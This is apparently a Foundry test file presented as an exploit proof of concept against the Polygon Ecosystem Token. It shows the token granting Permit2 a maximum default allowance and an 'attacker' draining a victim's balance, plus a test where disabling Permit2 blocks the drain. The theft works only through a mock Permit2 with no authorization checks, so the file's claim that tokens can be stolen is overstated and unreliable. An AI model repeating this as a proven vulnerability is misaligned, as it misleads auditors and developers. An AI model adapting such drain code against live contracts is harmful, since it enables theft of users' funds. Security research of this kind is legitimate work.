// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import {PolygonEcosystemToken} from "../src/PolygonEcosystemToken.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

// Mock Permit2 contract with just enough implementation to demonstrate the vulnerability
contract MockPermit2 {
    function transferFrom(address token, address from, address to, uint256 amount) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract POLExploitTest is Test {
    PolygonEcosystemToken polToken;
    MockPermit2 permit2;

    address migration = address(0x1);
    address emissionManager = address(0x2);
    address protocolCouncil = address(0x3);
    address emergencyCouncil = address(0x4);

    address victim = address(0x5);
    address attacker = address(0x6);

    function setUp() public {
        // Deploy our mock Permit2 at the exact same address as in the contract
        address permit2Address = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

        // Use vm.etch to deploy our mock implementation at the specific address
        vm.etch(permit2Address, address(new MockPermit2()).code);
        permit2 = MockPermit2(permit2Address);

        // Deploy the token with the constructor parameters
        vm.startPrank(migration);
        polToken = new PolygonEcosystemToken(migration, emissionManager, protocolCouncil, emergencyCouncil);

        // Fund victim with tokens
        polToken.transfer(victim, 1000e18);
        vm.stopPrank();

        // Verify initial setup
        console.log("Victim balance:", polToken.balanceOf(victim));
        console.log("Attacker balance:", polToken.balanceOf(attacker));

        // Check that permit2Enabled is true (set in constructor)
        assertTrue(polToken.permit2Enabled(), "Permit2 should be enabled by default");
    }

    function testNormalAllowance() public {
        // Show that victim has not approved any allowance for a random address
        address randomAddress = address(0x9);
        assertEq(polToken.allowance(victim, randomAddress), 0, "Victim should not have approved random address");

        // Attempt to transfer tokens - should fail
        vm.startPrank(randomAddress);
        // Use expectRevert with no specific message
        vm.expectRevert();
        polToken.transferFrom(victim, randomAddress, 1000e18);
        vm.stopPrank();

        // Verify balances unchanged
        assertEq(polToken.balanceOf(victim), 1000e18, "Victim balance should be unchanged");
        assertEq(polToken.balanceOf(randomAddress), 0, "Random address should not have tokens");
    }

    function testPermit2Vulnerability() public {
        // Show that victim has never approved any transfers
        // We'll check using the internal mapping via storage inspection
        bytes32 slot = keccak256(
            abi.encode(
                victim,
                keccak256(abi.encode(polToken.PERMIT2(), uint256(0))) // allowance slot in ERC20
            )
        );
        uint256 actualAllowance = uint256(vm.load(address(polToken), slot));
        console.log("Actual storage allowance for Permit2:", actualAllowance);
        assertEq(actualAllowance, 0, "Victim has not explicitly approved anything for Permit2");

        // But the overridden allowance function should return max when checked
        uint256 permit2Allowance = polToken.allowance(victim, polToken.PERMIT2());
        console.log("Permit2 allowance reported by contract:", permit2Allowance);
        assertEq(permit2Allowance, type(uint256).max, "Permit2 allowance should be max uint256");

        // Demonstrate the exploit
        console.log("Executing attack...");
        vm.prank(attacker);
        permit2.transferFrom(address(polToken), victim, attacker, 1000e18);

        // Verify the attack worked
        console.log("Victim balance after attack:", polToken.balanceOf(victim));
        console.log("Attacker balance after attack:", polToken.balanceOf(attacker));
        assertEq(polToken.balanceOf(victim), 0, "Victim should have 0 tokens after attack");
        assertEq(polToken.balanceOf(attacker), 1000e18, "Attacker should have stolen all tokens");
    }

    function testDisabledPermit2() public {
        // First disable Permit2 using the protocol council role
        vm.prank(protocolCouncil);
        polToken.updatePermit2Allowance(false);

        // Verify Permit2 is disabled
        assertFalse(polToken.permit2Enabled(), "Permit2 should be disabled");

        // Check that allowance is now zero
        uint256 permit2Allowance = polToken.allowance(victim, polToken.PERMIT2());
        assertEq(permit2Allowance, 0, "Permit2 allowance should be 0 when disabled");

        // Try to exploit - should fail now
        vm.prank(attacker);
        // Use expectRevert with no specific message
        vm.expectRevert();
        permit2.transferFrom(address(polToken), victim, attacker, 1000e18);

        // Verify balances unchanged
        assertEq(polToken.balanceOf(victim), 1000e18, "Victim balance should be unchanged when Permit2 disabled");
        assertEq(polToken.balanceOf(attacker), 0, "Attacker should not have tokens when Permit2 disabled");
    }
}
